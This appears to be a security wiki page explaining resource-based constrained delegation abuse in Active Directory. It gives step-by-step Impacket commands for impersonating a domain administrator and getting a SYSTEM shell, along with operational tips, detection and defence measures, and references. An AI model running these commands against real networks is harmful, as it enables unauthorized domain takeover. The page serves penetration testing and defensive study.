---
title: Resource-based constrained delegation (RBCD)
slug: resource-based-constrained-delegation
---

> **TL;DR:** The `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on a target computer enumerates principals allowed to S4U-impersonate any user to that computer. Anyone with write access to the attribute (the computer owner, or via relay/ACL) plus a controlled account with an SPN can pop SYSTEM on the target as any user — including a domain admin.

## What it is
RBCD was introduced in Server 2012 to invert classical (account-side) constrained delegation: instead of the delegating account listing "I trust X to act for me," the *resource* lists "I will accept S4U requests from these principals." The attribute is a binary SD; an entry granting Allow to attacker-controlled `EVIL$` means `EVIL$` can call S4U2self for any user (except those in Protected Users or marked sensitive) and then S4U2proxy to obtain a service ticket against the target as that user.

## Preconditions / where it applies
- Write rights on `msDS-AllowedToActOnBehalfOfOtherIdentity` of the target computer object (GenericAll, GenericWrite, WriteProperty, or computed via NTLM relay to LDAP)
- A controlled account with an SPN. Default `ms-DS-MachineAccountQuota = 10` lets any domain user create up to ten computer objects — instant SPN holder
- Network reach to a DC (Kerberos) and to the target service

## Technique
1. Create a sacrificial machine account (uses `MachineAccountQuota`):

```bash
addcomputer.py -computer-name 'EVIL$' -computer-pass 'Pwn!' \
  -dc-host dc01.corp.local corp.local/alice:Pass
```

2. Write the trust attribute on the victim, naming `EVIL$` as a permitted delegate:

```bash
rbcd.py -delegate-to 'VICTIM$' -delegate-from 'EVIL$' \
  -action write corp.local/alice:Pass -dc-ip 10.0.0.10
```

3. Perform the S4U dance — request a ticket as Administrator to the victim:

```bash
getST.py -spn cifs/victim.corp.local -impersonate Administrator \
  -dc-ip 10.0.0.10 corp.local/EVIL\$:'Pwn!'
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass victim.corp.local
```

The S4U2self leg works because RBCD doesn't require the calling account to have `TrustedToAuthForDelegation`; the S4U2proxy succeeds because the victim's SD lists `EVIL$`. The returned ticket is for `cifs/victim` as Administrator → SYSTEM shell.

Common trigger paths: relay coerced DC auth to LDAP and write RBCD on a target server ([[ms-rpc-abuse]] → ntlmrelayx `--delegate-access`), or chain a GenericWrite ACL on a computer object discovered via BloodHound.

SPN gotcha: when running Rubeus `s4u`, the `/altservice:cifs,host,http` flag rewrites the returned ticket's `sname` so a single S4U2proxy call yields tickets for multiple services on the same host — useful when you also want WinRM/WMI from the same impersonation. Watch the SPN format too: requesting `cifs/victim` (NetBIOS short name) sometimes succeeds where `cifs/victim.corp.local` (FQDN) fails depending on how the target's SPN is registered, so try both. The raw security-descriptor string written to `msDS-AllowedToActOnBehalfOfOtherIdentity` is `O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<SID-of-EVIL$>)` — the SID must be the *machine* account SID, not a user SID, or S4U2proxy will silently return KRB_AP_ERR_BADOPTION.

## Detection and defence
- Set `ms-DS-MachineAccountQuota = 0` for non-Tier-0 OUs; users should not be able to manufacture trusted SPN holders
- Audit changes to `msDS-AllowedToActOnBehalfOfOtherIdentity` (event 5136 on computer objects) — almost no legitimate workflow writes it
- Add sensitive accounts to Protected Users and mark them "Account is sensitive and cannot be delegated"
- Enforce LDAP signing + channel binding to block the relay-to-LDAP variant

## References
- [HackTricks — RBCD](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html) — command-by-command walkthrough
- [Hacker Recipes — RBCD](https://www.thehacker.recipes/a-d/movement/kerberos/delegations/rbcd) — protocol detail
- [Elad Shamir — Wagging the Dog](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html) — original RBCD research
- [ired.team — RBCD computer object takeover](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution) — PowerMad + Rubeus end-to-end lab
- See also: [[constrained-delegation]], [[unconstrained-delegation]], [[shadow-credentials]], [[ms-rpc-abuse]]
